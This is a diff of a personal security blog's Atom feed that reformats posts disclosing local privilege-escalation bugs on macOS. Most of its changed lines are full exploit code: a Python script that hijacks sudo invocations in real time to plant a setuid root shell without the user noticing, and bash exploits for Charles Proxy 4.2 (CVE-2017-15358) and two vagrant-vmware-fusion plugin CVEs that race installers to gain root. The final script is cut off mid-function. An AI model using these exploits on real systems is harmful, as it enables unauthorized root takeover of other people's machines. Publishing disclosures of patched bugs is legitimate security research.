@@ -6,7 +6,7 @@
   </author>
   <id>https://m4.rkw.io/blog/</id>
   <title>m4.rkw.io</title>
-  <updated>2022-02-14T11:45:43+00:00</updated>
+  <updated>2022-02-14T12:03:52+00:00</updated>
   <entry>
     <id>https://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy</id>
     <link href="https://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy"/>
@@ -519,7 +519,7 @@ script/binary is user-writable. If a rogue process can determine this scenario
 they have a narrow window in which the target script/binary can be replaced with
 something else in order to steal root privileges.</p><p>The proof of concept below demonstrates how this can be done, and includes a
 simple shell wrapper that forwards the sudo execution on to a copy of the
-original script so the user likely won&#x27;t notice anything.</p><p>https://m4.rkw.io/sudo_steal.py.txt
+original script so the user likely won&#x27;t notice anything.</p><p><pre>https://m4.rkw.io/sudo_steal.py.txt
 0d5bb04be60acf3ebb7a7f16932ebd8b8f75636ede85e4e5bcf1f08fbe5e25da
 -------------------------------------------------------------------------------
 #!/usr/bin/env python2.7
@@ -533,25 +533,25 @@ original script so the user likely won&#x27;t notice anything.</p><p>https://m4.
 #
 # in the time it takes you to enter your sudo password, sudo_steal.py will hijack
 # the target in order to steal a root shell, and then pass the execution chain
-# on to a copy of the script so the user running sudo won&#x27;t know anything is amis.</p><p>import os
+# on to a copy of the script so the user running sudo won&#x27;t know anything is amis.</pre></p><p><pre>import os
 import sys
-import time</p><p>
-# we can only hijack sudo if the target command/script is writable</p><p>def is_writable(path):
+import time</pre></p><p><pre>
+# we can only hijack sudo if the target command/script is writable</pre></p><p><pre>def is_writable(path):
   try:
     with open(path,&#x27;a+&#x27;) as f:
       pass
     return True
   except:
-    pass</p><p>  return False</p><p>
+    pass</pre></p><p><pre>  return False</pre></p><p><pre>
 # most user-owned stuff executed with sudo will be at a relative path so we
 # need to recursively search for it as quickly as possible.
 #
 # we only have the time it takes the user to enter their password to find
 # the target and hijack it, so this needs to be as fast as possible. this
 # should be quick enough on most mac or linux systems, but if you have a
-# bunch of directories with lots of files it may be too slow.</p><p>def fast_find_file(filename):
-  matches = []</p><p>  h = os.environ[&#x27;HOME&#x27;]</p><p>  home_path = &quot;%s/%s&quot; % (h, filename)</p><p>  if os.path.exists(home_path) and is_writable(home_path):
-    matches.append(home_path)</p><p>  dirs = []</p><p>  for x in os.popen(&quot;ls -a1 %s&quot; % (h)).read().rstrip().split(&quot;\n&quot;):
+# bunch of directories with lots of files it may be too slow.</pre></p><p><pre>def fast_find_file(filename):
+  matches = []</pre></p><p><pre>  h = os.environ[&#x27;HOME&#x27;]</pre></p><p><pre>  home_path = &quot;%s/%s&quot; % (h, filename)</pre></p><p><pre>  if os.path.exists(home_path) and is_writable(home_path):
+    matches.append(home_path)</pre></p><p><pre>  dirs = []</pre></p><p><pre>  for x in os.popen(&quot;ls -a1 %s&quot; % (h)).read().rstrip().split(&quot;\n&quot;):
     if os.path.isdir(&quot;%s/%s&quot; % (h, x)) and not os.path.islink(&quot;%s/%s&quot; % (h, x)):
       if x not in [
           &#x27;.&#x27;, &#x27;..&#x27;,
@@ -565,20 +565,20 @@ import time</p><p>
           &#x27;.vagrant.d&#x27;,
           &#x27;.ansible&#x27;
         ]:
-        dirs.append(&quot;%s/%s&quot; % (h, x))</p><p>  cmd = &quot;find %s -type f -name %s 2&gt;/dev/null&quot; % (&quot; &quot;.join(dirs), filename)</p><p>  for x in os.popen(cmd).read().rstrip().split(&quot;\n&quot;):
+        dirs.append(&quot;%s/%s&quot; % (h, x))</pre></p><p><pre>  cmd = &quot;find %s -type f -name %s 2&gt;/dev/null&quot; % (&quot; &quot;.join(dirs), filename)</pre></p><p><pre>  for x in os.popen(cmd).read().rstrip().split(&quot;\n&quot;):
     if os.path.exists(x) and is_writable(x):
-      matches.append(x)</p><p>  if len(matches) == 0:
-    return False</p><p>  return matches</p><p>
-# generate a temporary filename to move the hijacked script to</p><p>def get_target(match):
-  target = match + &#x27;x&#x27;</p><p>  while os.path.exists(target):
-    target += &#x27;x&#x27;</p><p>  return target</p><p>
-# check if the process is still alive</p><p>def alive(pid):
-  return os.system(&quot;ps %s 1&gt;/dev/null&quot; % (pid)) == 0</p><p>
+      matches.append(x)</pre></p><p><pre>  if len(matches) == 0:
+    return False</pre></p><p><pre>  return matches</pre></p><p><pre>
+# generate a temporary filename to move the hijacked script to</pre></p><p><pre>def get_target(match):
+  target = match + &#x27;x&#x27;</pre></p><p><pre>  while os.path.exists(target):
+    target += &#x27;x&#x27;</pre></p><p><pre>  return target</pre></p><p><pre>
+# check if the process is still alive</pre></p><p><pre>def alive(pid):
+  return os.system(&quot;ps %s 1&gt;/dev/null&quot; % (pid)) == 0</pre></p><p><pre>
 # we have a list of paths that may be the target, so hijack and redirect
-# them all</p><p>def exploit(pid, matches):
+# them all</pre></p><p><pre>def exploit(pid, matches):
   remap = {}
-  remapped = []</p><p>  for match in matches:
-    remap[match] = get_target(match)</p><p>    print &quot;hijacking %s...&quot; % (match)</p><p>    try:
+  remapped = []</pre></p><p><pre>  for match in matches:
+    remap[match] = get_target(match)</pre></p><p><pre>    print &quot;hijacking %s...&quot; % (match)</pre></p><p><pre>    try:
       # move the target out of the way and drop in a bash redirect script
       # that sets 0:0 and +s on our rootshell payload
       os.rename(match, remap[match])
@@ -590,41 +590,41 @@ import time</p><p>
       os.chmod(match, 0755)
       remapped.append(match)
     except:
-      pass</p><p>  if len(remapped) == 0:
+      pass</pre></p><p><pre>  if len(remapped) == 0:
     print &quot;hijack failed.&quot;
-    return</p><p>  success = False
+    return</pre></p><p><pre>  success = False
   while True:
     if os.stat(&quot;/tmp/.,&quot;).st_uid == 0:
       success = True
-      break</p><p>    if not alive(pid):
-      break</p><p>    time.sleep(1)</p><p>  # move the hijacked files back into place
+      break</pre></p><p><pre>    if not alive(pid):
+      break</pre></p><p><pre>    time.sleep(1)</pre></p><p><pre>  # move the hijacked files back into place
   for match in remapped:
-    os.rename(remap[match], match)</p><p>  if success:
+    os.rename(remap[match], match)</pre></p><p><pre>  if success:
     os.system(&quot;/tmp/.,&quot;)
-    sys.exit(0)</p><p>  print &quot;exploit failed.&quot;</p><p>
-# simple rootshell payload</p><p>with open(&quot;/tmp/.,.c&quot;,&quot;w&quot;) as f:
+    sys.exit(0)</pre></p><p><pre>  print &quot;exploit failed.&quot;</pre></p><p><pre>
+# simple rootshell payload</pre></p><p><pre>with open(&quot;/tmp/.,.c&quot;,&quot;w&quot;) as f:
   f.write(&quot;#include &lt;unistd.h&gt;\n&quot;)
   f.write(&quot;int main(){setuid(0);seteuid(0);execl(\&quot;/bin/bash\&quot;,&quot;)
   f.write(&quot;\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;rm -f /tmp/.,; /bin/bash\&quot;,NULL);&quot;)
-  f.write(&quot;return 0;}\n&quot;)</p><p>os.system(&quot;gcc -o /tmp/., /tmp/.,.c; rm -f /tmp/.,.c&quot;)</p><p>
-# continuously scan for hijackable processes</p><p>while True:
-  ps_lines = os.popen(&quot;ps -a -o pid= -o ppid= -o command= |xargs -L1&quot;).read().rstrip().split(&quot;\n&quot;)</p><p>  children = {}</p><p>  # build a map of children so we can avoid trying to hijack sudo
-  # processes that have children (i.e. already authenticated)</p><p>  for line in ps_lines:
+  f.write(&quot;return 0;}\n&quot;)</pre></p><p><pre>os.system(&quot;gcc -o /tmp/., /tmp/.,.c; rm -f /tmp/.,.c&quot;)</pre></p><p><pre>
+# continuously scan for hijackable processes</pre></p><p><pre>while True:
+  ps_lines = os.popen(&quot;ps -a -o pid= -o ppid= -o command= |xargs -L1&quot;).read().rstrip().split(&quot;\n&quot;)</pre></p><p><pre>  children = {}</pre></p><p><pre>  # build a map of children so we can avoid trying to hijack sudo
+  # processes that have children (i.e. already authenticated)</pre></p><p><pre>  for line in ps_lines:
     seg = line.split(&#x27; &#x27;)
     pid = seg[0]
-    ppid = seg[1]</p><p>    if not ppid in children.keys():
-      children[ppid] = []</p><p>    children[ppid].append(pid)</p><p>  # look for invocations of sudo that have prompted the user for their password
-  # and where the target binary/script is user-writable</p><p>  for line in ps_lines:
-    seg = line.split(&#x27; &#x27;)</p><p>    if seg[2] == &#x27;sudo&#x27;:
-      print &quot;potential target: %s&quot; % (line)</p><p>      pid = seg[0]</p><p>      # if sudo has child processes then it&#x27;s already authenticated
+    ppid = seg[1]</pre></p><p><pre>    if not ppid in children.keys():
+      children[ppid] = []</pre></p><p><pre>    children[ppid].append(pid)</pre></p><p><pre>  # look for invocations of sudo that have prompted the user for their password
+  # and where the target binary/script is user-writable</pre></p><p><pre>  for line in ps_lines:
+    seg = line.split(&#x27; &#x27;)</pre></p><p><pre>    if seg[2] == &#x27;sudo&#x27;:
+      print &quot;potential target: %s&quot; % (line)</pre></p><p><pre>      pid = seg[0]</pre></p><p><pre>      # if sudo has child processes then it&#x27;s already authenticated
       if pid in children.keys():
         print &quot;%s has children, skipping&quot; % (pid)
-        continue</p><p>      args = seg[3:]</p><p>      while True:
-        matches = fast_find_file(&quot; &quot;.join(args))</p><p>        if matches:
-          break</p><p>        args = args[0:len(args)-1]</p><p>        if len(args) == 0:
-          break</p><p>      if matches:
-        exploit(pid, matches)</p><p>  time.sleep(1)
-</p></summary>
+        continue</pre></p><p><pre>      args = seg[3:]</pre></p><p><pre>      while True:
+        matches = fast_find_file(&quot; &quot;.join(args))</pre></p><p><pre>        if matches:
+          break</pre></p><p><pre>        args = args[0:len(args)-1]</pre></p><p><pre>        if len(args) == 0:
+          break</pre></p><p><pre>      if matches:
+        exploit(pid, matches)</pre></p><p><pre>  time.sleep(1)
+</pre></p></summary>
     <title>hijacking sudo in real time</title>
     <updated>2018-08-15T22:03:15+00:00</updated>
     <dc:date>2018-08-15T22:03:15+00:00</dc:date>
@@ -644,14 +644,14 @@ root+suid then no password dialog is shown.</p><p>It doesn&#x27;t validate the p
 path to the binary at the time it was invoked. This means that between executing
 the binary and reaching the code path where root+suid is set there is enough
 time to replace the path to the binary with an alternate payload which will then
-receive the suid+root permissions instead of the Charles binary.</p><p>This issue was fixed in Charles 4.2.1 released in November 2017.</p><p>https://m4.rkw.io/charles_4.2.sh.txt
+receive the suid+root permissions instead of the Charles binary.</p><p>This issue was fixed in Charles 4.2.1 released in November 2017.</p><p><pre>https://m4.rkw.io/charles_4.2.sh.txt
 2f4a2dca6563d05a201108ec6e9454e2894b603b68b3b70b8f8b043b43ee9284
 -------------------------------------------------------------------------------
-#!/bin/bash</p><p>####################################################
+#!/bin/bash</pre></p><p><pre>####################################################
 ###### Charles 4.2 local root privesc exploit ######
 ###### by m4rkw - https://m4.rkw.io/blog.html ######
-####################################################</p><p>cd
-user=&quot;`whoami`&quot;</p><p>cat &gt; charles_exploit.c &lt;&lt;EOF
+####################################################</pre></p><p><pre>cd
+user=&quot;`whoami`&quot;</pre></p><p><pre>cat &gt; charles_exploit.c &lt;&lt;EOF
 #include &lt;unistd.h&gt;
 int main()
 {
@@ -660,15 +660,15 @@ int main()
   execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;rm -f \&quot;/Users/$user/Charles Proxy Settings\&quot;; /bin/bash&quot;,NULL);
   return 0;
 }
-EOF</p><p>gcc -o charles_exploit charles_exploit.c
+EOF</pre></p><p><pre>gcc -o charles_exploit charles_exploit.c
 if [ $? -ne 0 ] ; then
   echo &quot;failed to compile the exploit, you need xcode cli tools for this.&quot;
   exit 1
 fi
-rm -f charles_exploit.c</p><p>ln -s /Applications/Charles.app/Contents/Resources/Charles\ Proxy\ Settings
+rm -f charles_exploit.c</pre></p><p><pre>ln -s /Applications/Charles.app/Contents/Resources/Charles\ Proxy\ Settings
 ./Charles\ Proxy\ Settings --self-repair 2&gt;/dev/null &amp;
 rm -f ./Charles\ Proxy\ Settings
-mv charles_exploit Charles\ Proxy\ Settings</p><p>i=0</p><p>while :
+mv charles_exploit Charles\ Proxy\ Settings</pre></p><p><pre>i=0</pre></p><p><pre>while :
 do
   r=`ls -la Charles\ Proxy\ Settings |grep root`
   if [ &quot;$r&quot; != &quot;&quot; ] ; then
@@ -681,8 +681,8 @@ do
     echo &quot;Not vulnerable&quot;
     exit 1
   fi
-done</p><p>./Charles\ Proxy\ Settings
-</p></summary>
+done</pre></p><p><pre>./Charles\ Proxy\ Settings
+</pre></p></summary>
     <title>CVE-2017-15358 Local root privesc in Charles Proxy 4.2</title>
     <updated>2018-07-30T06:41:01+00:00</updated>
     <dc:date>2018-07-30T06:41:01+00:00</dc:date>
@@ -729,7 +729,7 @@ with its mastery of hardware design can fully solve.</p><p>Just get an air duste
     <summary><p>Another Hashicorp bug that I&#x27;ve been sitting on since late last year. This one
 was exploitable only during the vagrant update process, or even if the user
 typed &quot;vagrant plugin update&quot; and there was no pending update.</p><p>It was possible for a rogue process on the system to subvert the upgrade process
-in a way the user was unlikely to notice in order to steal root privileges.</p><p>This is now fixed.</p><p>https://m4.rkw.io/vagrant_vmware_privesc_5.0.2-5.0.4.sh.txt
+in a way the user was unlikely to notice in order to steal root privileges.</p><p>This is now fixed.</p><p><pre>https://m4.rkw.io/vagrant_vmware_privesc_5.0.2-5.0.4.sh.txt
 3efa119a3f20c852ffe64ec2d3dd81ef1186560aaf1b847b1d573e062195202f
 --------------------------------------------------------------------------------
 #!/bin/bash
@@ -737,8 +737,8 @@ echo &quot;##############################################&quot;
 echo &quot;vagrant_vmware_fusion 5.0.2-5.0.4 root privesc&quot;
 echo &quot;by m4rkw&quot;
 echo &quot;##############################################&quot;
-echo</p><p>ruby_version=`ls ~/.vagrant.d/gems/ |xargs`
-plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d &#x27;-&#x27; -f4`</p><p>echo &quot;compiling...&quot;</p><p>cat &gt; vvf.c &lt;&lt;EOF
+echo</pre></p><p><pre>ruby_version=`ls ~/.vagrant.d/gems/ |xargs`
+plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d &#x27;-&#x27; -f4`</pre></p><p><pre>echo &quot;compiling...&quot;</pre></p><p><pre>cat &gt; vvf.c &lt;&lt;EOF
 #include &lt;unistd.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -758,15 +758,15 @@ int main(int ac, char *av[])
   execl(&quot;/bin/bash&quot;,&quot;bash&quot;,NULL);
   return 0;
 }
-EOF</p><p>gcc -o /tmp/vvf_exp vvf.c
-rm -f vvf.c</p><p>echo &quot;waiting for user to initiate vagrant plugin update...&quot;</p><p>while :
+EOF</pre></p><p><pre>gcc -o /tmp/vvf_exp vvf.c
+rm -f vvf.c</pre></p><p><pre>echo &quot;waiting for user to initiate vagrant plugin update...&quot;</pre></p><p><pre>while :
 do
   r=`ps auxwww |grep &#x27;/usr/bin/sudo&#x27; |grep &#x27;vagrant-vmware-installer_darwin_amd64 install&#x27; |grep -v grep`
   if [ &quot;$r&quot; != &quot;&quot; ] ; then
     break
   fi
-done</p><p>pid=`ps auxww |grep &#x27;./vagrant-vmware-installer_darwin_amd64 install&#x27; |grep -v grep |xargs -L1 |cut -d &#x27; &#x27; -f2`</p><p>cd $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop</p><p>echo &quot;dropping payload in place of installer binary...&quot;</p><p>mv -f vagrant-vmware-installer_darwin_amd64 vagrant-vmware-installer_darwin_amd64.orig
-mv -f /tmp/vvf_exp vagrant-vmware-installer_darwin_amd64</p><p>echo &quot;waiting for payload to trigger...&quot;</p><p>while :
+done</pre></p><p><pre>pid=`ps auxww |grep &#x27;./vagrant-vmware-installer_darwin_amd64 install&#x27; |grep -v grep |xargs -L1 |cut -d &#x27; &#x27; -f2`</pre></p><p><pre>cd $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop</pre></p><p><pre>echo &quot;dropping payload in place of installer binary...&quot;</pre></p><p><pre>mv -f vagrant-vmware-installer_darwin_amd64 vagrant-vmware-installer_darwin_amd64.orig
+mv -f /tmp/vvf_exp vagrant-vmware-installer_darwin_amd64</pre></p><p><pre>echo &quot;waiting for payload to trigger...&quot;</pre></p><p><pre>while :
 do
   r=`ls -la /tmp/vvf_exp 2&gt;/dev/null |grep -- &#x27;-rwsr-xr-x&#x27; |grep root`
   if [ &quot;$r&quot; != &quot;&quot; ] ; then
@@ -775,7 +775,7 @@ do
     exit 0
   fi
 done
-</p></summary>
+</pre></p></summary>
     <title>CVE-2017-16512 Hashicorp vagrant-vmware-fusion v5.0.2-5.0.4 local root</title>
     <updated>2018-03-28T21:08:28+00:00</updated>
     <dc:date>2018-03-28T21:08:28+00:00</dc:date>
@@ -786,7 +786,7 @@ done
     <summary><p>Another exploit for the now deprecated vagrant-vmware-fusion plugin. This one
 only works if VMware Fusion is not installed which is an unlikely scenario.
 However if this should occur then it&#x27;s an easy root escalation so users should
-still update.</p><p>https://m4.rkw.io/vagrant_vmware_privesc_5.0.4.sh.txt
+still update.</p><p><pre>https://m4.rkw.io/vagrant_vmware_privesc_5.0.4.sh.txt
 92d193047970f90f18913cb8a1fe3b326c750dc68a2bc54be6b16e0d899c294a
 ------------------------------------------------------------------------------
 #!/bin/bash
@@ -797,7 +797,7 @@ echo &quot;# by m4rkw - https://m4.rkw.io/blog.html                #&quot;
 echo &quot;#########################################################&quot;
 echo &quot;# Note: only works when VMWare Fusion is not installed. #&quot;
 echo &quot;#########################################################&quot;
-echo</p><p>cleanup() {
+echo</pre></p><p><pre>cleanup() {
   exec 2&gt; /dev/null
   killall -9 vagrant 1&gt;/dev/null 2&gt;/dev/null
   kill -9 `ps auxwww |egrep &#x27;\/vagrant up$&#x27; |xargs -L1 |cut -d &#x27; &#x27; -f2` &amp;&gt;/dev/null
@@ -806,27 +806,27 @@ echo</p><p>cleanup() {
   rm -rf .vagrant_vmware_fusion_504_exp
   rm -rf /Applications/VMware\ Fusion.app
   mv -f ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb
-}</p><p>if [ -e &quot;/Applications/VMware Fusion.app&quot; ] ; then
+}</pre></p><p><pre>if [ -e &quot;/Applications/VMware Fusion.app&quot; ] ; then
   echo &quot;Fusion is installed, not exploitable.&quot;
   exit 1
-fi</p><p>echo &quot;setting up fake app directory...&quot;</p><p>mkdir /Applications/VMware\ Fusion.app
+fi</pre></p><p><pre>echo &quot;setting up fake app directory...&quot;</pre></p><p><pre>mkdir /Applications/VMware\ Fusion.app
 if [ ! $? -eq 0 ] ; then
   echo &quot;Failed to create /Applications/VMware Fusion.app.&quot;
   exit 1
-fi</p><p>mkdir -p /Applications/VMware\ Fusion.app/Contents/Library/services</p><p>touch /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+fi</pre></p><p><pre>mkdir -p /Applications/VMware\ Fusion.app/Contents/Library/services</pre></p><p><pre>touch /Applications/VMware\ Fusion.app/Contents/Library/vmrun
 touch /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
 chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmrun
-chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services</p><p>cat &gt; /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx &lt;&lt;EOF
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services</pre></p><p><pre>cat &gt; /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx &lt;&lt;EOF
 #!/bin/bash
 echo 1&gt;&amp;2
 echo &quot;VMware Fusion Information:&quot; 1&gt;&amp;2
 echo &quot;VMware Fusion 10.0.1 build-6754183 Release&quot; 1&gt;&amp;2
 echo
-EOF</p><p>chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx</p><p>cat &gt; /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack &lt;&lt;EOF
+EOF</pre></p><p><pre>chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx</pre></p><p><pre>cat &gt; /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack &lt;&lt;EOF
 #!/bin/bash
 chown root:wheel /tmp/vvp_504
 chmod 4755 /tmp/vvp_504
-EOF</p><p>chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack</p><p>echo &quot;compiling payload...&quot;</p><p>cat &gt; /tmp/vvp_504.c &lt;&lt;EOF
+EOF</pre></p><p><pre>chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack</pre></p><p><pre>echo &quot;compiling payload...&quot;</pre></p><p><pre>cat &gt; /tmp/vvp_504.c &lt;&lt;EOF
 #include &lt;unistd.h&gt;
 int main()
 {
@@ -837,30 +837,30 @@ int main()
 }
 EOF
 gcc -o /tmp/vvp_504 /tmp/vvp_504.c
-rm -f /tmp/vvp_504.c</p><p>cd
+rm -f /tmp/vvp_504.c</pre></p><p><pre>cd
 mkdir .vagrant_vmware_fusion_504_exp
-cd .vagrant_vmware_fusion_504_exp</p><p>echo &quot;writing dummy vagrantfile ...&quot;</p><p>cat &gt; vagrantfile &lt;&lt;EOF
+cd .vagrant_vmware_fusion_504_exp</pre></p><p><pre>echo &quot;writing dummy vagrantfile ...&quot;</pre></p><p><pre>cat &gt; vagrantfile &lt;&lt;EOF
 Vagrant.configure(&#x27;2&#x27;) do |config|
   config.vm.box = &#x27;envimation/ubuntu-xenial&#x27;
 end
-EOF</p><p>echo &quot;patching driver.rb...&quot;</p><p>if [ ! -e ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
+EOF</pre></p><p><pre>echo &quot;patching driver.rb...&quot;</pre></p><p><pre>if [ ! -e ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
   mv ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig
-fi</p><p>cat &gt; ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb &lt;&lt;EOF
-load File.dirname(__FILE__) + &quot;/driver.rb.orig&quot;</p><p>Dir.chdir(&quot;/Applications/VMware Fusion.app/Contents/Library/&quot;)</p><p>\`ln -sf /bin/ls vmnet-cli\`</p><p>Thread.new do
+fi</pre></p><p><pre>cat &gt; ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb &lt;&lt;EOF
+load File.dirname(__FILE__) + &quot;/driver.rb.orig&quot;</pre></p><p><pre>Dir.chdir(&quot;/Applications/VMware Fusion.app/Contents/Library/&quot;)</pre></p><p><pre>\`ln -sf /bin/ls vmnet-cli\`</pre></p><p><pre>Thread.new do
   system(&quot;/Users/#{ENV[&quot;USER&quot;]}/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status&quot;)
-end</p><p>sleep 1.0/ENV[&quot;DELAY&quot;].to_f</p><p>\`ln -sf vmnet-cli.hack vmnet-cli\`</p><p>exit 0
-EOF</p><p>echo
+end</pre></p><p><pre>sleep 1.0/ENV[&quot;DELAY&quot;].to_f</pre></p><p><pre>\`ln -sf vmnet-cli.hack vmnet-cli\`</pre></p><p><pre>exit 0
+EOF</pre></p><p><pre>echo
 echo &quot;attempting to exploit the race condition...&quot;
 echo &quot;(the more loaded the system the longer this will take)&quot;
-echo</p><p>echo -n &quot;racing: &quot;</p><p>success=0
+echo</pre></p><p><pre>echo -n &quot;racing: &quot;</pre></p><p><pre>success=0
 i=0
 delay=80
 previous_dir=0
 gap=5
-max_attempts=250</p><p>while :
+max_attempts=250</pre></p><p><pre>while :
 do
   export DELAY=&quot;$delay&quot;
-  printf &quot;%x&quot; $DELAY</p><p>  x=`vagrant up 2&gt;&amp;1`</p><p>  if [ &quot;`echo &quot;$x&quot; |grep &#x27;illegal option&#x27;`&quot; != &quot;&quot; ] ; then
+  printf &quot;%x&quot; $DELAY</pre></p><p><pre>  x=`vagrant up 2&gt;&amp;1`</pre></p><p><pre>  if [ &quot;`echo &quot;$x&quot; |grep &#x27;illegal option&#x27;`&quot; != &quot;&quot; ] ; then
     if [ $previous_dir -eq 2 -a $gap -gt 1 ] ; then
       gap=$((gap-1))
     fi
@@ -878,20 +878,20 @@ do
       success=1
       break
     fi
-  fi</p><p>  i=$((i+1))</p><p>  if [ $i -eq $max_attempts ] ; then
+  fi</pre></p><p><pre>  i=$((i+1))</pre></p><p><pre>  if [ $i -eq $max_attempts ] ; then
     break
   fi
-done</p><p>cleanup</p><p>if [ ! $success -eq 1 ] ; then
+done</pre></p><p><pre>cleanup</pre></p><p><pre>if [ ! $success -eq 1 ] ; then
   echo
   echo
   echo &quot;exploit failed.&quot;
   exit 1
-fi</p><p>echo
+fi</pre></p><p><pre>echo
 echo
 echo &quot;SUCCESS!&quot;
 cd
 /tmp/vvp_504
-</p></summary>
+</pre></p></summary>
     <title>CVE-2017-16839 Hashicorp vagrant-vmware-fusion v5.0.4 local root</title>
     <updated>2018-03-28T21:03:02+00:00</updated>
     <dc:date>2018-03-28T21:03:02+00:00</dc:date>
@@ -914,7 +914,7 @@ to cause the old plugin to be removed. Hopefully this will be addressed soon.</p
 were meant to fix it apparently don&#x27;t work unless you follow the update notes
 and manually remove the old plugin.</p><p>---- update 28/03/18 20:56 ----</p><p>Turns out the issue is fixed, it just doesn&#x27;t do the cleanup of the old plugin
 until you execute vagrant. Seems odd not to do this during the installation
-process but oh well, at least it works.</p><p>https://m4.rkw.io/vagrant_vmware_privesc_4.0.25-5.0.4.sh.txt
+process but oh well, at least it works.</p><p><pre>https://m4.rkw.io/vagrant_vmware_privesc_4.0.25-5.0.4.sh.txt
 f8fbea90f70e978a8178d45930fff05477e2836204d9d81b6ddad73a338cfb66
 --------------------------------------------------------------------------------
 #!/bin/bash
@@ -923,11 +923,11 @@ echo &quot;################################################################&quot
 echo &quot;# vagrant_vmware_fusion plugin 4.0.25-5.0.4 local root privesc #&quot;
 echo &quot;# by m4rkw - https://m4.rkw.io/blog.html                       #&quot;
 echo &quot;################################################################&quot;
-echo</p><p>cleanup() {
+echo</pre></p><p><pre>cleanup() {
   rm -rf ~/.vagrant_vmware_fusion_504_exp
   mv -f ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb
-}</p><p>gem_version=&quot;2.4.2&quot;
-plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d &#x27;-&#x27; -f4 |tail -n1`</p><p>cat &gt; /tmp/vvp_504.c &lt;&lt;EOF
+}</pre></p><p><pre>gem_version=&quot;2.4.2&quot;
+plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d &#x27;-&#x27; -f4 |tail -n1`</pre></p><p><pre>cat &gt; /tmp/vvp_504.c &lt;&lt;EOF
 #include &lt;unistd.h&gt;
 int main()
 {
@@ -938,14 +938,14 @@ int main()
 }
 EOF
 gcc -o /tmp/vvp_504 /tmp/vvp_504.c
-rm -f /tmp/vvp_504.c</p><p>cd
+rm -f /tmp/vvp_504.c</pre></p><p><pre>cd
 mkdir .vagrant_vmware_fusion_504_exp
-cd .vagrant_vmware_fusion_504_exp</p><p>if [ ! -e ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
+cd .vagrant_vmware_fusion_504_exp</pre></p><p><pre>if [ ! -e ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
   mv ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig
-fi</p><p>cat &gt; ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb &lt;&lt;EOF
+fi</pre></p><p><pre>cat &gt; ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb &lt;&lt;EOF
 system(&quot;/Users/#{ENV[&quot;USER&quot;]}/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status&quot;)
 exit 0
-EOF</p><p>success=0</p><p>export PATH=.:$PATH</p><p>function attempt()
+EOF</pre></p><p><pre>success=0</pre></p><p><pre>export PATH=.:$PATH</pre></p><p><pre>function attempt()
 {
   cat &gt; /tmp/vvp_504.c &lt;&lt;EOF
 #include &lt;unistd.h&gt;
@@ -963,7 +963,7 @@ int main(int ac, char *av[])
 }
 EOF
   gcc -o $1 /tmp/vvp_504.c
